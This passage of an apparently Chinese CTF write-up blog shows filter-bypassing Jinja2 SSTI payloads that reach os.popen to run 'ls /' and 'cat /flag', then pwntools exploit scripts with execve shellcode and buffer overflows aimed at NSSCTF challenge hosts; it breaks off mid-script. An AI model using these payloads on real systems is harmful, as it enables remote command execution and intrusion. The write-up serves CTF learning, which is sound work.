config|attr(&#39;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#39;|format(95,95,99,108,97,115,115,95,95))|attr(&#39;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#39;|format(95,95,105,110,105,116,95,95))|attr(&#39;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#39;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#39;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#39;|format(95,95,103,101,116,105,116,101,109,95,95))(&#39;o&#39;+&#39;s&#39;)|attr(&#39;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#39;|format(112,111,112,101,110))(&#39;ls&#39;)|attr(&#39;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:C&#125;&#39;|format(114,101,97,100))()%&#125;无论中间怎么排错改了又改还是不对，马上崩溃，又去看了一下文章发现4.发现一种过滤器的方法&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)&#x3D;&#x3D;&#39;__class__&#39;抱着试试的想法再次构造起payload&#123;%print config|attr(&#39;%c%c%c%c%c%c%c%c%c&#39;|format(95,95,99,108,97,115,115,95,95))|attr(&#39;%c%c%c%c%c%c%c%c&#39;|format(95,95,105,110,105,116,95,95))|attr(&#39;%c%c%c%c%c%c%c%c%c%c%c&#39;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#39;%c%c%c%c%c%c%c%c%c%c%c&#39;|format(95,95,103,101,116,105,116,101,109,95,95))(&#39;o&#39;&#39;s&#39;)|attr(&#39;%c%c%c%c%c&#39;|format(112,111,112,101,110))(&#39;ls &#x2F;&#39;)|attr(&#39;%c%c%c%c&#39;|format(114,101,97,100))()%&#125;Hello, $ app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $!发现出了，然后紧接着就cat &#x2F;flag&#123;%print config|attr(&#39;%c%c%c%c%c%c%c%c%c&#39;|format(95,95,99,108,97,115,115,95,95))|attr(&#39;%c%c%c%c%c%c%c%c&#39;|format(95,95,105,110,105,116,95,95))|attr(&#39;%c%c%c%c%c%c%c%c%c%c%c&#39;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#39;%c%c%c%c%c%c%c%c%c%c%c&#39;|format(95,95,103,101,116,105,116,101,109,95,95))(&#39;o&#39;&#39;s&#39;)|attr(&#39;%c%c%c%c%c&#39;|format(112,111,112,101,110))(&#39;cat &#x2F;flag&#39;)|attr(&#39;%c%c%c%c&#39;|format(114,101,97,100))()%&#125;NSSCTF&#123;55dabaa2-4d3b-4935-bc79-41c702d4fffd&#125;但是第3，4，方法其实差不多但是不知道为啥3出不了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后总结一下子</p><pre class="line-numbers language-none"><code class="language-none">通过&#123;%%&#125; 绕过&#123;&#123;&#125;&#125;通过 |attr()  绕过   .   []通过&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)  绕过过滤的关键字  总体构造  &#123;%print config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;&#39;).read() %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这一个题大概花了2小时，把我这个web小白对ssti产生了阴影，但是强度确实可以，好在搜到了上面两篇文章。</p><h2 id="问卷来力！"><a href="#问卷来力！" class="headerlink" title="问卷来力！"></a>问卷来力！</h2><p>填问卷得flag</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="EASY-PWN"><a href="#EASY-PWN" class="headerlink" title="EASY PWN"></a>EASY PWN</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span>  <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span><span class="token comment">#context(arch='amd64', os='linux', log_level='debug')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node6.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28972</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> num          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info    <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr          <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia<span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#定义gdb调试函数</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1f</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x11D6</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">":\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>找一个小于0x25的shellcode就行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span>  <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node6.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28972</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> num          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info    <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr          <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia<span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node6.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28861</span><span class="token punctuation">)</span>shellcode<span class="token operator">=</span><span class="token string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span>sla<span class="token punctuation">(</span><span class="token string">"Please.\n"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>payload <span class="token operator">=</span>  <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xa</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6010a0</span><span class="token punctuation">)</span> sla<span class="token punctuation">(</span><span class="token string">'start!\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token keyword">is</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="真男人下120层"><a href="#真男人下120层" class="headerlink" title="真男人下120层"></a>真男人下120层</h2><p>real_man,种子函数的值可以确定，即可以计算随机值，这是在arch里面运行的随机值</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">1522127470</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">120</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"'%d',"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-nonespan aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node6.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28067</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> num          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info    <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr          <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia<span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  rc<span class="token punctuation">(</span><span class="token punctuation">)</span>  sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rc<span class="token punctuation">(</span><span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RANDOM"><a href="#RANDOM" class="headerlink" title="RANDOM"></a>RANDOM</h2><p>参考：<a href="https://blog.csdn.net/m0_50819561/article/details/120662408">https://blog.csdn.net/m0_50819561/article/details/120662408</a></p><p>概率跑出来flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./RANDOM'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28457</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> num          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info    <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr          <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia<span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x601080</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>asm<span class="token punctuation">(</span><span class="token string">'mov rax,0x601080;call rax'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40094e</span><span class="token punctuation">)</span><span class="token operator">+</span>asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30;jmp 